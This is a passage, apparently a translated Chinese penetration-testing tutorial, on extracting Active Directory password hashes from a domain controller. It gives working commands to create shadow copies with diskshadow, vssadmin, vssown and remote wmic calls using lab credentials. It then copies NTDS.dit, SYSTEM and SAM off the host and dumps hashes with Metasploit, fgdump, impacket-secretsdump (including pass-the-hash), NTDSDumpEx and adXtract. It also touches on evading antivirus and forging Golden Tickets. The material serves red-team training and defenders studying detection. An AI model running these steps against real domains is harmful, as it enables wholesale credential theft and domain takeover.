    reset
应该注意， DiskShadow二进制文件需要从 _C:\Windows\System32_ 路径执行。 如果从其他路径调用它，脚本将无法正确执行。
    diskshadow.exe /s c:\diskshadow.txt
> Diskshadow
直接从解释器运行以下命令将列出系统的所有可用的卷影拷贝。
    diskshadow
    LIST SHADOWS ALL
> diskshadow - 提取卷影拷贝
SYSTEM注册表配置单元也应该被复制，因为它包含解密NTDS文件内容的密钥。
    reg.exe save hklm\system c:\exfil\system.bak
> diskshadow - 从Registry复制系统
## WMI
Sean Metcalf在他的博客中证明，可以通过WMI远程提取NTDS.DIT和SYSTEM文件。 此技巧使用vssadmin二进制文件来创建卷影拷贝。
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
> WMI - 创建卷影拷贝
然后，它远程执行复制命令，以便将卷影拷贝中的NTDS.DIT文件解压缩到目标系统上的另一个目录中。
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
> WMI - 复制NTDS文件
这同样适用于SYSTEM文件。
    wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
> WMI - 复制系统文件
然后，解压缩的文件可以从域控制器传输到另一个Windows系统，以转储域密码哈希值。
    PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
    PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
> 通过copy传输文件
如果进一步拿去生成黄金票据(Golden Ticket)，则可以替换凭证，使用它通过域控制器的Kerberos协议身份验证。（参见文末参考链接）
## VSSADMIN
卷影拷贝(VSS)是一个Windows命令行程序。它使得管理员可以备份计算机，卷和文件，即使它们正在被操作系统使用。
卷影拷贝作为服务运行，并要求文件系统为NTFS格式，默认情况下所有现代操作系统都是如此。在Windows命令提示符执行以下操作将创建C：驱动器的快照，以便用户将通常无法访问的文件复制到其他位置（本地文件夹，网络文件夹或可移动介质）。
    vssadmin create shadow /for=C:
> vssadmin - 创建卷影拷贝
由于C：驱动器中的所有文件都已复制到另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，从而可以访问并复制到另一个位置。
命令COPY会把NTDS.DIT和SYSTEM文件复制到本地驱动器上的新建文件夹ShadowCopy中。
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
> 从卷影拷贝中复制文件
这些文件需要从域控制器复制到另外的主机以进行进一步处理。
> ShadowCopy 文件夹下的文件
## vssown
与vssadmin程序类似， Tim Tomes开发了vssown
，它是一个可视化的脚本，可以创建和删除卷影拷贝，从卸载的卷影拷贝里运行任意的可执行文件，以及启动和停止卷影拷贝服务。
    cscript vssown.vbs /start
    cscript vssown.vbs /create c
    cscript vssown.vbs /list
    cscript vssown.vbs /delete
> vssown - 卷影拷贝
可以使用命令COPY复制所需的文件。
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\vssown
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SYSTEM C:\vssown
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SAM C:\vssown
> vssown - 复制NTDS，SYSTEM和SAM文件
## Metasploit
Metasploit框架有一个模块，它通过服务器消息块（Server Message Block,
SMB）服务直接与域控制器进行身份验证，创建系统驱动器的卷影拷贝，并将NTDS.DIT和SYSTEM配置单元的副本下载到Metasploit目录中。
这些文件可以与impacket等其他工具一起使用，这些工具可以执行Active Directory的密码哈希的提取。
    auxiliary/admin/smb/psexec_ntdsgrab
> Metasploit - NTDS模块
还有一个后期利用模块，可以链接到现有的Meterpreter会话，以便通过ntdsutil方法提取域哈希。
    windows/gather/credentials/domain_hashdump
或者，如果有现成的到域控制器的Meterpreter会话，则可以使用命令hashdump 。 但是，此方法被认为是不安全的，因为它可能会使域控制器崩溃。
    hashdump
> Metasploit - DC上的Hashdump
## fgdump
fgdump是一个老的可执行文件，可以提取LanMan和NTLM的密码哈希值。 如果已获得本地管理员凭据，则可以在本地或远程运行fgdump。
在运行期间，fgdump将尝试关闭系统上可能存在的反病毒软件，如果成功，则会将所有数据写入两个文件中。
但是说实话，如果存在反病毒软件或终端安全解决方案，为了避免被探测到攻击行为，不应使用fgdump转储密码哈希。因为大多数反病毒公司（包括Microsoft的Windows
Defender）都会对其进行查杀。
    fgdump.exe
> fgdump - 域控制器
可以通过检查.pwdump文件的内容来提取密码哈希值。
    type 127.0.0.1.pwdump
> fgdump - pwdump文件
## NTDS提取
Impacket是一组python脚本，可用于执行各种任务，包括提取NTDS文件的内容。impacket-secretsdump模块需要SYSTEM和NTDS两个数据库文件。
    impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
> impacket - 提取NTDS内容
此外， impacket还可以通过使用计算机帐户及其哈希进行身份验证从NTDS.DIT文件远程转储域密码哈希。
    impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
> impacket - 远程提取NTDS内容
作为impacket的替代解决方案， NTDSDumpEx二进制文件可以从Windows主机中提取域密码哈希值。
    NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
> NTDSDumpEx
还有一个shell脚本adXtract ，它可以将用户名和密码哈希导出为一种通用格式，继而被常见的密码破解程序使用，例如John the
Ripper和Hashcat。
    ./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab
> adXtract
该脚本将所有信息写入项目名称下的各种文件中，当数据库文件NTDS的解密完成后，将用户列表和密码哈希值导出到控制台中。
该脚本将提供有关域用户的大量信息，如下所示。
> adXtract - 用户列表
密码哈希将以下列格式显示。
## 参考链接
[Active Directory 概述](https://support.microsoft.com/zh-cn/help/196464)
[从NTDS.dit获取密码哈希值的三种方法](https://www.secpulse.com/archives/73178.html)
[How the Active Directory – Data Store Really
Works](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1)
[Kerberos Golden Ticket
Protection](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)
[Kerberos的黄金票据详解](https://www.cnblogs.com/backlion/p/8127868.html)